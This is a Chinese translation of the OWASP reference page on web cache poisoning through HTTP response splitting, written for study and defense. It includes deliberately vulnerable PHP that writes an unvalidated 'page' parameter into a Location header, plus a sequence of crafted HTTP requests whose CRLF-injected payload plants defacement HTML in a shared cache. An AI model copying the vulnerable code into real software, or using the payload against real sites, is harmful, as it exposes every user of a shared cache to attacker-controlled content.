[TOC]

*最新版本(mm/dd/yy): 04/23/2009*

翻译自[Cache Poisoning](https://www.owasp.org/index.php/Cache_Poisoning "Cache Poisoning")

# 漏洞描述
- 一个构建恶意请求碰撞的危害在web缓存被多人共享或个人浏览器存在缓存的情况下将被放大。如果响应缓存在共享网络缓存中，例如代理服务器中常见的缓存，则该缓存的所有用户都将继续接收恶意内容，直到缓存条目被清除。相似地，如果响应缓存在单个用户的浏览器中，意味着那个用户将持续接收恶意内容直到缓存条目清空，尽管只有本地浏览器实例的用户会受到影响。

- 为了成功执行这样的攻击，攻击者
  - 找到服务端的代码漏洞，它允许他们用多个标头填充HTTP标头字段
  - 强制缓存服务器刷新它的缓存内容，即使内容是正常的
  - 发送一个特别制作的请求，它将被存入缓存中
  - 发送下一个请求。前一个被注入缓存的内容将会作为该请求的响应
- 这种攻击在现实中很难实现。条件清单很长，攻击者很难完成。不过，使用这种技术比跨用户界面更加实用
- 由于Web应用程序中的HTTP响应拆分和漏洞，造就了缓存投毒攻击的可能。从攻击者的角度，关键是应用允许用CR(回车）和LF（换行）链接多个标头为一个标头

# 攻击示例
我们找到一个网站，从'page'参数中获取服务器名然后重定向（302）到这台服务器
e.g. [http://testsite.com/redir.php?page=http://other.testsite.com/](http://testsite.com/redir.php?page=http://other.testsite.com/ "http://testsite.com/redir.php?page=http://other.testsite.com/")
以及redir.php的示例代码:

```php
<?php
header ("Location: " . $_GET['page']);
?>
```

构造特定的请求
- 【1】从缓存中删除页面

```php
GET http://testsite.com/index.html HTTP/1.1
Pragma: no-cache
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
```

HTTP请求头中字段`"Pragma: no-cache"` 或 `"Cache-Control: no-cache"`会将页面从缓存中移除（明显地，在页面存在缓存的情况下）

- 【2】使用HTTP响应拆分，我们强制缓存服务器为一个请求生成两个响应

```php
GET http://testsite.com/redir.php?site=%0d%0aContent-
Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-
Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aConte
nt-Length:%2020%0d%0aContent-
Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
```
我们故意在第二个HTTP响应头的"Last-Modified"字段设置一个未来的时间（设置为2009年10月27日）来让响应存储在缓存中。我们可以用以下标头实现这个效果：
	-  Last-Modified (通过If-Modified-Since标头进行检查)
	-  ETag (通过If-None-Match标头进行检查)

- 【3】向服务器发送我们想要替换缓存内容的请求

```php
GET http://testsite.com/index.html HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
```

- 理论上，缓存服务器应使用请求#2的第二个响应来匹配请求#3。这样我们就替换了缓存内容。其余的请求应该在一个连接期间执行（如果缓存服务器不需要使用更复杂的方法），可能立即一个接一个地执行。

- 将此攻击用作缓存中毒的通用技术可能会出现问题。原因是缓存服务器的链接模型和请求处理实现不尽相同。这意味着什么？示例的方法在Apache2.x缓存开启，使用mod_proxy和mod_cache的插件下奏效，但在Squid服务器上无效

- 另一个不同的问题是URL长度，有时这将杜绝放置必要的响应头，然后将其与中毒页面的请求相匹配的做法。

- 使用的请求示例来自[1]，它们根据本文的需求进行了修改。

- 更多的信息可以在这篇文档中找到，它侧重于这些类型的攻击[1]http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf by Amit Klein, Director of Security and Research

# 相关的威胁代理
待定

# 相关攻击方式
- [HTTP响应拆分](https://www.andseclab.cn/2018/04/13/owasp%e6%b1%89%e5%8c%96%e6%94%bb%e5%87%bb%e7%b3%bb%e5%88%97%e5%a4%a7%e5%85%a8%e4%b8%89%e5%8d%81%e5%9b%9b-http%e5%93%8d%e5%ba%94%e6%8b%86%e5%88%86%e6%94%bb%e5%87%bb/ "HTTP响应拆分")
- [跨用户污损攻击](https://www.andseclab.cn/2018/04/12/owasp%e6%b1%89%e5%8c%96%e6%94%bb%e5%87%bb%e7%b3%bb%e5%88%97%e5%a4%a7%e5%85%a8%e4%ba%8c%e5%8d%81%e4%ba%8c-%e8%b7%a8%e7%94%a8%e6%88%b7%e6%b1%a1%e6%8d%9f%e6%94%bb%e5%87%bb/ "用户污损攻击")

# 相关漏洞
- [类别：输入验证漏洞](https://www.owasp.org/index.php/Category:Input_Validation_Vulnerability "类别：输入验证漏洞")

# 相关防御
- [输入验证](https://www.owasp.org/index.php/Input_Validation "输入验证])
- [规范化](https://www.owasp.org/index.php/Canonicalization "规范化")

# 参考
待定